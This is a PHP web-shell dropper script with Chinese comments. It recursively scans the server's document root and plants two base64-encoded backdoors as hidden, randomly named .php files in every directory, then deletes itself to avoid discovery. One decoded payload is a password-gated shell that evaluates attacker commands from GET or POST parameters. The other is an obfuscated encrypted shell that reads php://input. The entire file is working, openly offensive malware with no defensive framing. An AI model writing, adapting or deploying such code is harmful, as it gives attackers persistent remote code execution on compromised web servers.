<?php
//  ignore_user_abort(true);
//  set_time_limit(0);
 $file = 'c.php';
$arr_dir = array();
$dist_file = array();
 $shellcode = "PD9waHAKJFA9c3RyX3JlcGxhY2UoJ1V2JywnJywnY3JVdmVhVXZVdnRlX2ZVdnVVdm5VdmN0aW9uJyk7CiRGPSckaz0iYUU+OGQ0MDFlYiI7RT4ka0U+aD0iM0U+NWQyMmNjMjUxY2QiRT5FPjska0U+ZkU+PSI1YjkyOTZiOTY2MWQiO0U+JHA9IkdLOEU+RT5CQnplWFVqbGxVRmVYIjtFPmZ1bic7CiRFPSdFPkU+KCIvJGtoKC4rKSRrZi8iLEBmRT5pbEU+ZV9nZUU+dF9FPmNvbnRlRT5udHMoInBoRT5wOkU+Ly9pbnB1RT50IiksJG0pPT0xKSB7QG9iX3N0YUU+cnQoKUU+O0BldmEnOwokTj0nZW5kRT5fY2xFPmVhbigpO0U+RT4kcj1AYmFzZTZFPjRfZW5FPmNvZGUoQHgoQGd6Y0U+b21wcmVzRT5zKCRFPm8pLCRFPmspKTtwcmludCgiRT4kRT5wJGtoJHIka2YiKTt9JzsKJFU9J0U+bChAZ3p1bmNFPm9tcHJlRT5zRT5zKEB4KEBiRT5hc2U2NF9kZUU+Y29kZSgkbVsxXSlFPkU+LCRrKSlFPik7JG89QEU+b0U+Yl9nZXRfY29udGVudHMoKTtART5vYl8nOwokTD0nY3RFPmlvRT5uIHgoJHQsJGspRT57JGM9c3RFPnJsZW4oJGspRT47JGxFPj1zdHJsRT5lbigkdClFPkU+OyRvPSIiO2ZFPm9yKCRpRT49MDskaTwkbDspe2ZvcihFPiRFPic7CiRTPSdFPkU+aj0wOygkajwkYyYmJGk8JEU+bClFPjskaisrLCRpK0U+Kyl7JG8uPSRFPnR7JGl9XiRrRT57JGp9O319cmVFPnR1ckU+biAkbzt9aUU+ZiAoQHByZUU+Z19tRT5hdGNoJzsKJEE9c3RyX3JlcGxhY2UoJ0U+JywnJywkRi4kTC4kUy4kRS4kVS4kTik7CiRSPSRQKCcnLCRBKTskUigpOwplY2hvKCc8aDM+QWNjZXNzIERlbmllZDwvaDM+Jyk7Cj8+";
 $code = base64_decode($shellcode);
 $shellcode_2 = "PD9waHAgCiRwYXNzID0gJF9HRVRbJ3Bhc3MnXTsKaWYobWQ1KCRwYXNzKSA9PT0gJ2NkZjRkYjQwN2I1Yjc3YzlmMDIxMDJlNjA3MzNlMDExJyl7CiAgaWYoaXNzZXQoJF9HRVRbJ2NtZF9nJ10pKXsKICAJZXZhbCgkX0dFVFsnY21kX2cnXSk7CiAgfWVsc2UgaWYoaXNzZXQoJF9QT1NUWydjbWRfcCddKSkgewogIAlldmFsKCRfUE9TVFsnY21kX3AnXSk7CiAgfWVsc2UgewogICAgICBlY2hvKCdjbWQ/Pz8nKTsKICB9Cn1lbHNlIHsKCWVjaG8oJzxoMz5BY2Nlc3MgRGVuaWVkPC9oMz4nKTsKfQ==";
 $code_2 = base64_decode($shellcode_2);
function file_check($dir)
{
    //扫描文件夹
    global $arr_dir;
    $files;
    if (is_dir($dir)) {
        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== false) {
                if ($file != '.' && $file != "..") {
                    if (is_dir($dir . "/" . $file)) {
                        $arr_dir[] = $dir;
                        $files[$file] = file_check($dir . "/" . $file);
                        //拼接文件
                    } else {
                        $arr_dir[] = $dir;
                        $files[] = $dir . "/" . $file;
                    }
                }
            }
        }
    }
    closedir($handle);
    $arr_dir = array_unique($arr_dir);
    //去重
}
function create_uuid_file_name(){
    $name = md5(time().rand());
    $file_name = $name.'.php';
    return '.'.$file_name;
}
file_check($_SERVER['DOCUMENT_ROOT']);
try {
    foreach ($arr_dir as $path) {
        $file_name = create_uuid_file_name();
        file_put_contents($path.DIRECTORY_SEPARATOR.$file_name, $code);
        echo($path.DIRECTORY_SEPARATOR.$file_name.'<br/>');
    }
    echo("<br/>");
    foreach ($arr_dir as $path) {
        $file_name = create_uuid_file_name();
        file_put_contents($path.DIRECTORY_SEPARATOR.$file_name, $code_2);
        echo($path.DIRECTORY_SEPARATOR.$file_name.'<br/>');
    }
} catch (Exception $e) {
    var_dump($e);
}

//删除自身，以免文件泄露。
unlink(__FILE__);



?>